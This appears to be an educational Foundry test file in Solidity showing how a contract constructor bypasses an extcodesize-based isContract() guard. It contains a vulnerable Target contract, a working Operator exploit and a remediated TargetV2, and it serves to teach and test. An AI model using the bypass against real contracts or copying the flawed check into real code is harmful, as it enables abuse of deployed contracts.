// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    Target TargetContract;
    FailedOperator FailedOperatorContract;
    Operator OperatorContract;
    TargetV2 TargetRemediatedContract;

    constructor() {
        TargetContract = new Target();
        FailedOperatorContract = new FailedOperator();
        TargetRemediatedContract = new TargetV2();
    }

    function testBypassFailedContractCheck() public {
        console.log(
            "Before operation",
            TargetContract.completed()
        );
        console.log("operate Failed");
        FailedOperatorContract.execute(address(TargetContract));
    }

    function testBypassContractCheck() public {
        console.log(
            "Before operation",
            TargetContract.completed()
        );
        OperatorContract = new Operator(address(TargetContract));
        console.log(
            "After operation",
            TargetContract.completed()
        );
        console.log("operate completed");
    }

    receive() external payable {}
}

contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public completed = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        completed = true;
    }
}

contract FailedOperator is Test {
    // Attempting to call Target.protected will fail,
    // Target block calls from contract
    function execute(address _target) external {
        // This will fail
        vm.expectRevert("no contract allowed");
        Target(_target).protected();
    }
}

contract Operator {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}

contract TargetV2 {
    function isContract(address account) public view returns (bool) {
        require(tx.origin == msg.sender);
        return account.code.length > 0;
    }

    bool public completed = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        completed = true;
    }
}